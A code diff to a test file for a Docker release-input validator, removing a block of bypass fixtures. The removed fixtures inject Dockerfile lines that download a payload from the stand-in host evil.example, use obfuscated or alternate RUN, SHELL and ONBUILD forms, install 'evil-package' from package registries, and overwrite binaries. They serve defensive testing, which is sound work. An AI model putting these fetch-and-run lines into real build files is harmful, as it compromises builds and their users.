@@ -8,8 +8,6 @@ const root=resolve(import.meta.dirname,'..');
 const run=dir=>spawnSync(process.execPath,['scripts/validate-release-inputs.mjs'],{cwd:dir,encoding:'utf8'});
 assert.equal(run(root).status,0);
 const replace=(d,path,from,to)=>{const p=join(d,path),s=readFileSync(p,'utf8');assert.ok(s.includes(from),`fixture missing ${from}`);writeFileSync(p,s.replace(from,to));};
-const syncDerivedGraph=d=>{const raw=readFileSync(join(d,'docker/Dockerfile'),'utf8'),instructions=[];let current='';for(const source of raw.split(/\r?\n/)){const line=source.replace(/\s+#.*$/,'').trim();if(!line||(!current&&line.startsWith('#')))continue;current+=(current?' ':'')+line.replace(/\\$/,'').trim();if(!line.endsWith('\\')){instructions.push(current.replace(/\s+/g,' '));current='';}}const p=join(d,'docker/release-instruction-allowlist.json'),j=JSON.parse(readFileSync(p,'utf8'));j.instructions=instructions;writeFileSync(p,JSON.stringify(j,null,2)+'\n');};
-const coordinated=(d,mutate)=>{mutate();syncDerivedGraph(d);};
 const mutations=[
  d=>replace(d,'docker/Dockerfile','FROM rust:1.93-bookworm@sha256:','FROM rust:1.93-bookworm # sha256:'),
  d=>replace(d,'docker/Dockerfile','RUN command -v pkg-config','RUN apt-get update && apt-get install -y pkg-config && command -v pkg-config'),
@@ -64,25 +62,6 @@ const mutations=[
  d=>replace(d,'docker/Dockerfile','# ============================================','# check=skip=all\n# ============================================'),
  d=>replace(d,'docker/release-inputs.json','"schemaVersion": 1,','"schemaVersion": 1,\n  "schemaVersion": 1,'),
  d=>replace(d,'docker/release-instruction-allowlist.json','"schemaVersion": 1,','"schemaVersion": 1,\n  "schemaVersion": 1,'),
-
- // Coordinated bypass matrix from exact-head review: every graph differs from the closed positive graph.
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`RUN python3 -c "import urllib.request; urllib.request.urlretrieve('https://evil.example/p','/tmp/p')"
-RUN useradd -m -s /bin/bash wechat`)),
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`RUN ["python3", "-c", "import urllib.request; urllib.request.urlretrieve('https://evil.example/p','/tmp/p')"]
-RUN useradd -m -s /bin/bash wechat`)),
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`RUN c"ur"l https://evil.example/p -o /tmp/p\nRUN useradd -m -s /bin/bash wechat`)),
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`run curl https://evil.example/p -o /tmp/p\nRUN useradd -m -s /bin/bash wechat`)),
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`SHELL ["python3", "-c"]
-RUN import urllib.request; urllib.request.urlretrieve('https://evil.example/p','/tmp/p')
-RUN useradd -m -s /bin/bash wechat`)),
- ...['git clone https://evil.example/repo','npm install evil-package','gem install evil-package','cargo install evil-package'].map(command=>d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`RUN ${command}
-RUN useradd -m -s /bin/bash wechat`))),
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','COPY entrypoint.sh /entrypoint.sh',`ADD git@github.com:moby/buildkit.git#v0.10.1 /tmp/buildkit\nCOPY entrypoint.sh /entrypoint.sh`)),
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`ONBUILD RUN python3 -c "import urllib.request; urllib.request.urlretrieve('https://evil.example/p','/tmp/p')"
-RUN useradd -m -s /bin/bash wechat`)),
- d=>coordinated(d,()=>{writeFileSync(join(d,'docker/evil-fetch'),'#!/bin/sh\npython3 -c "import urllib.request; urllib.request.urlretrieve(\'https://evil.example/p\',\'/tmp/p\')"\n');replace(d,'docker/Dockerfile','COPY entrypoint.sh /entrypoint.sh',`COPY evil-fetch /usr/local/bin/evil-fetch\nRUN chmod +x /usr/local/bin/evil-fetch && /usr/local/bin/evil-fetch\nCOPY entrypoint.sh /entrypoint.sh`);}),
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`RUN printf evil > /usr/local/bin/sqlcipher\nRUN useradd -m -s /bin/bash wechat`)),
- d=>coordinated(d,()=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat',`RUN rm -rf /opt/novnc && mkdir /opt/novnc && printf evil > /opt/novnc/index.html\nRUN useradd -m -s /bin/bash wechat`)),
 ];
 for(const [index,mutate] of mutations.entries()){const d=mkdtempSync(join(tmpdir(),'release-inputs-'));try{for(const x of ['docker','.github','scripts'])cpSync(join(root,x),join(d,x),{recursive:true});mutate(d);const result=run(d);assert.notEqual(result.status,0,`mutation ${index + 1} escaped validator: ${result.stdout}`);}finally{rmSync(d,{recursive:true,force:true});}}
 // Existing cache must be verified before the downloader can report success.
